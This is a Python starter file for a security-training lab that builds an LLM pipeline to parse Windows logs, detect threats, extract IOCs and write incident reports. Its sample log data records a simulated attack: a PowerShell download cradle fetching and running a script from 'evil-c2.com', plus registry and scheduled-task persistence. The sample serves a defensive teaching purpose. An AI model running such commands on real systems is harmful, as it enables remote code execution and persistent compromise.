#!/usr/bin/env python3
"""
Lab 04: LLM-Powered Security Log Analysis - Starter Code

Use Large Language Models to analyze security logs.

Instructions:
1. Complete each TODO section
2. Test with sample logs in data/ folder
3. Compare output with expected results
"""

import json
import os
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# LangChain imports
try:
    from langchain_anthropic import ChatAnthropic
    from langchain_core.messages import HumanMessage, SystemMessage

    ANTHROPIC_AVAILABLE = True
except ImportError:
    ANTHROPIC_AVAILABLE = False

try:
    from langchain_community.chat_models import ChatOllama

    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

# Rich for pretty output
from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel

console = Console()


# =============================================================================
# Task 1: Set Up LLM Client
# =============================================================================


def setup_llm(provider: str = "anthropic"):
    """
    Initialize the LLM client.

    Args:
        provider: "anthropic" or "ollama"

    Returns:
        Configured LLM client
    """

    if provider == "anthropic":
        if not ANTHROPIC_AVAILABLE:
            raise ImportError("langchain-anthropic not installed")

        api_key = os.getenv("ANTHROPIC_API_KEY")
        if not api_key:
            raise ValueError("ANTHROPIC_API_KEY not set in environment")

        # TODO: Ask your AI assistant:
        # "Write Python code to create a ChatAnthropic client using the model
        # 'claude-sonnet-4-20250514', then test it by invoking a simple message
        # asking it to say 'ready', and return the configured client."
        #
        # Then review and test the generated code.
        # Stuck? See the Hints section in README.md
        pass

    elif provider == "ollama":
        if not OLLAMA_AVAILABLE:
            raise ImportError("langchain-community not installed")

        # TODO: Ask your AI assistant:
        # "Write Python code to create a ChatOllama client using the model
        # 'llama3.1:8b', test it with a simple message, and return the client."
        #
        # Then review and test the generated code.
        pass

    else:
        raise ValueError(f"Unknown provider: {provider}")


# =============================================================================
# Task 2: Log Parser Agent
# =============================================================================

PARSER_SYSTEM_PROMPT = """You are a security log parser. Your task is to extract
structured information from raw security logs.

For each log entry, extract:
- timestamp: ISO format datetime
- event_type: Type of event (Process Creation, Logon, Network Connection, etc.)
- event_id: Windows Event ID if present
- source: Computer/hostname
- user: Username involved
- details: Key details as nested object
- severity: 1-10 scale (10 being most severe)

Return ONLY valid JSON, no other text."""


def parse_log_entry(llm, log_entry: str) -> dict:
    """
    Use LLM to parse a raw log entry into structured data.

    Args:
        llm: Language model client
        log_entry: Raw log text

    Returns:
        Structured dict with parsed fields
    """

    prompt = f"""Parse this security log entry:

```
{log_entry}
```

Return a JSON object with these fields:
- timestamp
- event_type
- event_id
- source
- user
- details (object with relevant key-value pairs)
- severity (1-10)"""

    # TODO: Ask your AI assistant:
    # "Write Python code to send a prompt to an LLM using SystemMessage and
    # HumanMessage from LangChain. Use PARSER_SYSTEM_PROMPT as the system message
    # and the log parsing prompt as the human message. Parse the JSON response,
    # handling JSONDecodeError by attempting to extract JSON from the response text."
    #
    # Then review and test the generated code.
    # Stuck? See the Hints section in README.md
    pass


def parse_multiple_logs(llm, log_text: str) -> List[dict]:
    """
    Parse multiple log entries from a text block.

    Args:
        llm: Language model client
        log_text: Text containing multiple log entries

    Returns:
        List of parsed log dictionaries
    """
    # TODO: Ask your AI assistant:
    # "Write Python code to split a log text block into individual log entries
    # (entries are separated by blank lines or common log delimiters), then call
    # parse_log_entry() for each entry and return the list of parsed logs."
    #
    # Then review and test the generated code.
    pass


# =============================================================================
# Task 3: Threat Detection Analyzer
# =============================================================================

ANALYZER_SYSTEM_PROMPT = """You are an expert security analyst specializing in
threat detection and incident response. You have deep knowledge of:
- Windows Event Logs and their security implications
- MITRE ATT&CK framework techniques
- Common attack patterns (lateral movement, persistence, exfiltration)
- Indicators of Compromise (IOCs)

When analyzing logs, you:
1. Look for suspicious patterns and anomalies
2. Correlate events to identify attack chains
3. Map activities to MITRE ATT&CK techniques
4. Extract actionable IOCs
5. Assess severity and impact
6. Provide specific, actionable recommendations

Be thorough but concise. Cite specific log entries as evidence."""


def analyze_logs_for_threats(llm, logs: List[dict]) -> dict:
    """
    Analyze a batch of parsed logs for security threats.

    Args:
        llm: Language model client
        logs: List of parsed log entries

    Returns:
        Analysis dict with:
        - threats_detected: List of identified threats
        - attack_chain: Sequence of attack stages
        - iocs: Extracted indicators
        - mitre_mapping: ATT&CK techniques
        - severity: Overall severity (1-10)
        - confidence: Confidence in findings (0-100%)
        - recommendations: Suggested actions
    """

    # Format logs for context
    logs_context = json.dumps(logs, indent=2, default=str)

    prompt = f"""Analyze these security logs for threats and suspicious activity:

```json
{logs_context}
```

Provide your analysis as JSON with these fields:
- threats_detected: array of threat descriptions
- attack_chain: array describing the sequence of events
- iocs: object with ips, domains, files, users arrays
- mitre_mapping: array of objects with technique_id, technique_name, evidence
- severity: number 1-10
- confidence: number 0-100
- recommendations: array of specific actions to take"""

    # TODO: Ask your AI assistant:
    # "Write Python code to send the threat analysis prompt to an LLM using
    # ANALYZER_SYSTEM_PROMPT as the system message. Invoke the LLM with the
    # messages, parse the JSON response, and return the analysis dictionary."
    #
    # Then review and test the generated code.
    pass


# =============================================================================
# Task 4: IOC Extractor
# =============================================================================


def extract_iocs(llm, text: str) -> dict:
    """
    Extract Indicators of Compromise from text.

    Args:
        text: Any text that may contain IOCs

    Returns:
        Dict with categorized IOCs:
        - ips: List of IP addresses
        - domains: List of domain names
        - urls: List of URLs
        - hashes: Dict with md5, sha1, sha256 lists
        - file_paths: List of file paths
        - usernames: List of usernames
        - emails: List of email addresses
    """

    prompt = f"""Extract all Indicators of Compromise (IOCs) from this text:

```
{text}
```

Find and categorize:
- IP addresses (IPv4 and IPv6)
- Domain names
- URLs
- File hashes (MD5, SHA1, SHA256)
- File paths
- Usernames
- Email addresses

Return as JSON with these keys: ips, domains, urls, hashes (with md5, sha1, sha256 sub-keys), file_paths, usernames, emails.
Each should be an array. Return empty arrays if none found."""

    # TODO: Ask your AI assistant:
    # "Write Python code to send the IOC extraction prompt to an LLM, parse
    # the JSON response to get categorized IOCs (ips, domains, urls, hashes,
    # file_paths, usernames, emails), validate the format, deduplicate results,
    # and return the cleaned IOC dictionary."
    #
    # Then review and test the generated code.
    pass


def validate_iocs(iocs: dict) -> dict:
    """
    Validate and clean extracted IOCs.

    Args:
        iocs: Dictionary of extracted IOCs

    Returns:
        Cleaned and validated IOC dictionary
    """
    # TODO: Ask your AI assistant:
    # "Write Python code to validate IOCs: check IP addresses match IPv4/IPv6
    # regex patterns, validate domain format, verify hash lengths (MD5=32,
    # SHA1=40, SHA256=64), remove duplicates from all arrays, and filter out
    # obvious false positives like localhost or example.com."
    #
    # Then review and test the generated code.
    pass


# =============================================================================
# Task 5: Incident Summary Generator
# =============================================================================

SUMMARY_SYSTEM_PROMPT = """You are a security analyst writing an incident report.
Your audience includes both technical staff and executives.

Write clearly and concisely. Use bullet points for lists.
Include all relevant technical details but explain significance.
Prioritize actionable information."""


def generate_incident_summary(llm, analysis: dict) -> str:
    """
    Generate a human-readable incident summary in Markdown.

    Args:
        analysis: Output from analyze_logs_for_threats()

    Returns:
        Markdown-formatted incident report
    """

    prompt = f"""Based on this security analysis, write an incident report:

Analysis Data:
```json
{json.dumps(analysis, indent=2, default=str)}
```

Write a Markdown incident report with these sections:
1. **Executive Summary** - 2-3 sentences overview
2. **Timeline** - Numbered sequence of events
3. **Technical Details** - What happened technically
4. **MITRE ATT&CK Mapping** - Table of techniques observed
5. **Indicators of Compromise** - Formatted for easy blocking
6. **Impact Assessment** - What's at risk
7. **Recommendations** - Prioritized action items

Use proper Markdown formatting."""

    # TODO: Ask your AI assistant:
    # "Write Python code to send the incident summary prompt to an LLM using
    # SUMMARY_SYSTEM_PROMPT as the system message. Return the LLM's response
    # content as a Markdown-formatted string for the incident report."
    #
    # Then review and test the generated code.
    pass


# =============================================================================
# Task 6: Complete Pipeline
# =============================================================================


def analyze_security_incident(log_data: str, llm=None) -> str:
    """
    Complete pipeline: Parse -> Analyze -> Summarize.

    Args:
        log_data: Raw log data (multiple entries)
        llm: Optional pre-configured LLM client

    Returns:
        Complete incident report in Markdown
    """

    console.print("[bold blue]Security Log Analysis Pipeline[/bold blue]\n")

    # Step 1: Initialize LLM
    console.print("[yellow]Step 1:[/yellow] Initializing LLM...")
    if llm is None:
        llm = setup_llm()

    # TODO: Ask your AI assistant:
    # "Write Python code to complete the security analysis pipeline:
    # 1. Call parse_multiple_logs() to parse log_data into structured entries
    # 2. Call analyze_logs_for_threats() on the parsed logs
    # 3. Call extract_iocs() on the raw log_data and add to analysis['iocs']
    # 4. Call generate_incident_summary() to create the final report
    # 5. Print progress messages using console.print() for each step
    # 6. Return the generated summary report"
    #
    # Then review and test the generated code.

    # Step 2: Parse logs
    console.print("[yellow]Step 2:[/yellow] Parsing log entries...")
    # parsed_logs = parse_multiple_logs(llm, log_data)
    # console.print(f"  Parsed {len(parsed_logs)} log entries")

    # Step 3: Analyze threats
    console.print("[yellow]Step 3:[/yellow] Analyzing for threats...")
    # analysis = analyze_logs_for_threats(llm, parsed_logs)

    # Step 4: Extract IOCs
    console.print("[yellow]Step 4:[/yellow] Extracting IOCs...")
    # iocs = extract_iocs(llm, log_data)
    # analysis['iocs'] = iocs

    # Step 5: Generate summary
    console.print("[yellow]Step 5:[/yellow] Generating incident report...")
    # summary = generate_incident_summary(llm, analysis)

    # return summary

    # Placeholder
    return "# Incident Report\n\nPipeline not yet implemented."


# =============================================================================
# Sample Data & Main Execution
# =============================================================================

SAMPLE_LOGS = """
# Attack Scenario: PowerShell Download Cradle to Persistence

2024-01-15 03:22:10 | WORKSTATION01 | PowerShell | 4104 | ScriptBlock:
$wc = New-Object System.Net.WebClient
$wc.DownloadString('http://evil-c2.com/payload.ps1') | IEX

2024-01-15 03:22:15 | WORKSTATION01 | Security | 4688 |
NewProcessName: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c whoami && hostname && ipconfig /all
ParentProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SubjectUserName: jsmith
SubjectDomainName: CORP

2024-01-15 03:22:18 | WORKSTATION01 | Sysmon | 3 |
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
DestinationIp: 185.143.223.47
DestinationPort: 443
DestinationHostname: evil-c2.com

2024-01-15 03:23:00 | WORKSTATION01 | Security | 4688 |
NewProcessName: C:\\Windows\\System32\\reg.exe
CommandLine: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\Users\\Public\\malware.exe"
ParentProcessName: powershell.exe
SubjectUserName: jsmith

2024-01-15 03:25:00 | WORKSTATION01 | Security | 4698 |
TaskName: \\Microsoft\\Windows\\Maintenance\\SecurityUpdate
TaskContent: <Command>C:\\Users\\Public\\malware.exe</Command>
SubjectUserName: jsmith
SubjectDomainName: CORP
"""


def main():
    """Main execution."""
    console.print(
        Panel.fit(
            "[bold]Lab 04: LLM-Powered Security Log Analysis[/bold]",
            border_style="blue",
        )
    )

    # Check for required packages
    if not ANTHROPIC_AVAILABLE and not OLLAMA_AVAILABLE:
        console.print("[red]Error: No LLM provider available![/red]")
        console.print("Install langchain-anthropic or langchain-community")
        return

    # Run pipeline
    console.print("\n[bold]Analyzing sample attack logs...[/bold]\n")

    try:
        report = analyze_security_incident(SAMPLE_LOGS)

        console.print("\n" + "=" * 60)
        console.print("[bold green]INCIDENT REPORT[/bold green]")
        console.print("=" * 60 + "\n")

        console.print(Markdown(report))

    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        console.print("\n[yellow]Hint: Make sure to complete the TODO sections![/yellow]")


if __name__ == "__main__":
    main()
